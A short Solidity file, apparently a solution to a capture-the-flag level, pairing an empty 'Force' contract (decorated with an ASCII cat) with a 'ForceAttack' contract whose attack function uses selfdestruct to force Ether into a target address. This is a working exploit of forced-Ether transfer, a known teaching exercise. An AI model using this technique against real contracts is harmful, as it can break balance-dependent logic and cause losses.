// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttack {
    constructor() payable public {}
    
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}